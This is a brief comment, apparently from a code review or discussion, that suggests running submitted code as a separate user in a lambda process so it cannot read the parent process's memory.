The only suggestion I would make is to have the submission run as a different user. That would further lock down the process and make sure it's not able to access the memory of the parent process. I'm not sure how much of that is configurable within the lambda process though, the benefits may outweigh the effort.
